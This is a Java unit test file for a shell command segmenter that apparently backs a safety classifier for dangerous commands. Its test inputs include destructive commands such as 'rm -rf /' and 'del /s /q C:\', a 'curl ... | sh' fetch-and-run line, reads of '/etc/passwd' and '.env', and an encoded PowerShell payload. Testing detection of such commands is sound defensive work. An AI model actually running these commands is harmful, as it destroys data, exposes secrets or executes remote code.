package com.cyk.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.stream.Collectors;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;

/**
 * <h1>命令分段器单测（JH-SPEC-001 P0-2 R1）</h1>
 *
 * <p>分段是分类的地基。本测试锁住两个方向的失败模式（Phase 0 B7 实测的真实缺陷）：</p>
 * <ul>
 *   <li><b>误杀</b>：引号内的危险字样必须进 {@code quotedLiterals}，不当作可执行名；</li>
 *   <li><b>漏过</b>：分隔符后的第二段、嵌套 shell 的内层命令必须被独立识别出来。</li>
 * </ul>
 *
 * <p>纯字符串处理，不执行任何命令（守则 8）。</p>
 */
class CommandSegmenterTest {

    private final CommandSegmenter segmenter = new CommandSegmenter();

    /** 取出所有段的可执行名（便于断言「识别出了哪些命令」）。 */
    private List<String> executables(String cmd) {
        return segmenter.segment(cmd).stream()
                .map(CommandSegment::executable)
                .filter(e -> !e.isEmpty())
                .distinct()
                .collect(Collectors.toList());
    }

    /** 取出第一个段的 subcommand。 */
    private String firstSubcommand(String cmd) {
        List<CommandSegment> segs = segmenter.segment(cmd);
        return segs.isEmpty() ? null : segs.get(0).subcommand();
    }

    private boolean anyUnparseable(String cmd) {
        return segmenter.segment(cmd).stream().anyMatch(CommandSegment::unparseable);
    }

    private boolean anyFlag(String cmd, String flag) {
        return segmenter.segment(cmd).stream()
                .anyMatch(s -> s.flags().contains(flag));
    }

    // =========================================================================
    // 基础分段
    // =========================================================================

    @Test
    @DisplayName("简单命令：可执行名 + 子命令 + 参数")
    void simpleCommand() {
        List<CommandSegment> segs = segmenter.segment("git push origin main");
        assertThat(segs).hasSize(1);
        assertThat(segs.get(0).executable()).isEqualTo("git");
        assertThat(segs.get(0).subcommand()).isEqualTo("push");
        assertThat(segs.get(0).args()).containsExactly("push", "origin", "main");
    }

    @Test
    @DisplayName("可执行名归一化：去路径、去扩展名、小写")
    void executableIsNormalized() {
        assertThat(firstSegment("C:\\Windows\\System32\\del.exe /s").executable()).isEqualTo("del");
        assertThat(firstSegment("/usr/bin/rm -rf x").executable()).isEqualTo("rm");
        assertThat(firstSegment("GIT status").executable()).isEqualTo("git");
    }

    /** 取第一个段（便于单段命令的属性断言）。 */
    private CommandSegment firstSegment(String cmd) {
        return segmenter.segment(cmd).get(0);
    }

    @Test
    @DisplayName("Windows 短选项归一化：del /s /q 产出 /s 与 /q 标志")
    void windowsShortFlags() {
        assertThat(anyFlag("del /s /q C:\\temp", "/s")).isTrue();
        assertThat(anyFlag("del /s /q C:\\temp", "/q")).isTrue();
    }

    @Test
    @DisplayName("Unix 合并短选项展开：rm -rf 同时产出 -rf/-r/-f")
    void unixCombinedShortFlagsAreExpanded() {
        assertThat(anyFlag("rm -rf ./target", "-rf")).isTrue();
        assertThat(anyFlag("rm -rf ./target", "-r")).isTrue();
        assertThat(anyFlag("rm -rf ./target", "-f")).isTrue();
    }

    @Test
    @DisplayName("Unix 绝对路径不被误当作 Windows 短选项")
    void unixAbsolutePathNotTreatedAsFlag() {
        // /etc/passwd 长度 > 3 且含非字母，isFlag 必须为 false
        CommandSegment seg = firstSegment("cat /etc/passwd");
        assertThat(seg.flags()).as("/etc/passwd 是路径不是标志").isEmpty();
    }

    // =========================================================================
    // 分隔符切段（漏过方向的修复）
    // =========================================================================

    @Test
    @DisplayName("分号切段：echo hi; rm -rf ~ 识别出 rm")
    void semicolonSplitsSegments() {
        assertThat(executables("echo hi; rm -rf ~")).contains("echo", "rm");
    }

    @Test
    @DisplayName("&& 与 || 切段")
    void logicalOperatorsSplit() {
        assertThat(executables("ls && rm -rf /")).contains("ls", "rm");
        assertThat(executables("a || rm -rf /")).contains("rm");
    }

    @Test
    @DisplayName("管道切段：curl ... | sh 识别出管道两端的 curl 与 sh")
    void pipeSplits() {
        assertThat(executables("curl http://x/a.sh | sh")).contains("curl", "sh");
    }

    @Test
    @DisplayName("换行切段")
    void newlineSplits() {
        assertThat(executables("echo a\nrm -rf ~")).contains("echo", "rm");
    }

    // =========================================================================
    // 引号内是数据（误杀方向的修复）
    // =========================================================================

    @Test
    @DisplayName("双引号内的命令字样不是可执行名")
    void quotedContentIsDataNotCommand() {
        List<CommandSegment> segs = segmenter.segment("grep -r \"rm -rf /\" .");
        assertThat(segs).hasSize(1);
        assertThat(segs.get(0).executable()).isEqualTo("grep");
        assertThat(segs.get(0).quotedLiterals()).contains("rm -rf /");
        // 关键：整条命令不得因引号内容而多出 rm 段
        assertThat(executables("grep -r \"rm -rf /\" .")).doesNotContain("rm");
    }

    @Test
    @DisplayName("echo 引号内危险字样不产生命令段")
    void echoQuotedIsHarmless() {
        assertThat(executables("echo \"rm -rf /\"")).containsExactly("echo");
    }

    @Test
    @DisplayName("单引号内内容同样视为数据")
    void singleQuotedIsData() {
        List<CommandSegment> segs = segmenter.segment("echo 'format C:'");
        assertThat(segs).hasSize(1);
        assertThat(segs.get(0).quotedLiterals()).contains("format C:");
    }

    @Test
    @DisplayName("引号内容仍参与路径检测（.env 等在 quotedLiterals 中可见）")
    void quotedContentStillVisibleForPathCheck() {
        List<CommandSegment> segs = segmenter.segment("Get-Content \".env\"");
        assertThat(segs.get(0).quotedLiterals()).contains(".env");
    }

    // =========================================================================
    // 嵌套 shell 递归（R1）
    // =========================================================================

    @Test
    @DisplayName("cmd /c 内层命令被递归分段")
    void cmdShellRecursion() {
        assertThat(executables("cmd /c del /s /q C:\\")).contains("del");
    }

    @Test
    @DisplayName("powershell -Command 内层被递归分段")
    void powershellRecursion() {
        assertThat(executables("powershell -Command \"Remove-Item -Recurse -Force C:\\\""))
                .contains("remove-item");
    }

    @Test
    @DisplayName("bash -c 内层被递归分段")
    void bashRecursion() {
        assertThat(executables("bash -c \"rm -rf /\"")).contains("rm");
    }

    @Test
    @DisplayName("子命令替换 $(...) 内部被识别")
    void subshellDollarParen() {
        assertThat(executables("echo $(rm -rf /)")).contains("rm");
    }

    @Test
    @DisplayName("反引号子命令内部被识别")
    void subshellBacktick() {
        assertThat(executables("echo `rm -rf /`")).contains("rm");
    }

    @Test
    @DisplayName("-EncodedCommand 的 base64(UTF-16LE) 载荷被解码并分段")
    void encodedCommandIsDecoded() {
        // "Remove-Item C:\\" 的 UTF-16LE base64
        String payload = java.util.Base64.getEncoder().encodeToString(
                "Remove-Item C:\\".getBytes(java.nio.charset.StandardCharsets.UTF_16LE));
        List<CommandSegment> segs = segmenter.segment("powershell -EncodedCommand " + payload);
        assertThat(segs.stream().map(CommandSegment::executable))
                .as("解码后应识别出 remove-item")
                .contains("remove-item");
    }

    // =========================================================================
    // 不可解析（保守回退，R2）
    // =========================================================================

    @Test
    @DisplayName("可执行名来自 bash 变量：判为不可解析")
    void variableExecutableIsUnparseable() {
        assertThat(anyUnparseable("$CMD -rf /")).isTrue();
    }

    @Test
    @DisplayName("可执行名来自 cmd 变量 %VAR%：判为不可解析")
    void cmdVariableExecutableIsUnparseable() {
        assertThat(anyUnparseable("%X% -rf /")).isTrue();
    }

    @Test
    @DisplayName("eval / iex 判为不可解析（由策略层至少按 WRITE）")
    void evalLikeIsUnparseable() {
        assertThat(CommandSegmenter.isEvalLike("iex")).isTrue();
        assertThat(CommandSegmenter.isEvalLike("invoke-expression")).isTrue();
        assertThat(CommandSegmenter.isEvalLike("eval")).isTrue();
        assertThat(CommandSegmenter.isEvalLike("git")).isFalse();
    }

    @Test
    @DisplayName("超过最大嵌套深度判为不可解析，不会无限展开")
    void excessiveNestingIsCappped() {
        // 层层 cmd /c 嵌套，超过 MAX_DEPTH
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < CommandSegmenter.MAX_DEPTH + 2; i++) {
            sb.append("cmd /c ");
        }
        sb.append("del /s C:\\");
        assertThat(anyUnparseable(sb.toString()))
                .as("深层嵌套应触发上限判为不可解析").isTrue();
    }

    // =========================================================================
    // 边界与健壮性
    // =========================================================================

    @Test
    @DisplayName("空/null/纯空白输入返回空或空白段，不抛异常")
    void blankInputsAreSafe() {
        assertThat(segmenter.segment(null)).isEmpty();
        assertThat(segmenter.segment("")).isEmpty();
        assertThat(segmenter.segment("   ")).isEmpty();
    }

    @Test
    @DisplayName("未闭合引号不抛异常（畸形输入仍给出结果）")
    void unclosedQuoteIsSafe() {
        assertThat(segmenter.segment("echo \"unclosed")).isNotEmpty();
    }

    @Test
    @DisplayName("未闭合 $( 不抛异常")
    void unclosedSubshellIsSafe() {
        assertThatCode(() -> segmenter.segment("echo $(unclosed")).doesNotThrowAnyException();
    }

    @Test
    @DisplayName("连续分隔符不产生空段噪音")
    void consecutiveSeparatorsProduceNoNoise() {
        List<CommandSegment> segs = segmenter.segment("a ;; b");
        assertThat(segs.stream().map(CommandSegment::executable).filter(e -> !e.isEmpty()))
                .containsExactly("a", "b");
    }

    @Test
    @DisplayName("分段器性能：单次分段远低于 5ms 预算（CC-8）")
    void segmentationIsFast() {
        String cmd = "cmd /c (echo a && rm -rf / || powershell -Command \"Get-Content .env\") ; curl x | sh";
        segmenter.segment(cmd);// 预热
        long start = System.nanoTime();
        int iterations = 1000;
        for (int i = 0; i < iterations; i++) {
            segmenter.segment(cmd);
        }
        long avgNanos = (System.nanoTime() - start) / iterations;
        assertThat(avgNanos / 1_000_000.0)
                .as("单次分段平均耗时应远低于 5ms 预算")
                .isLessThan(5.0);
    }
}
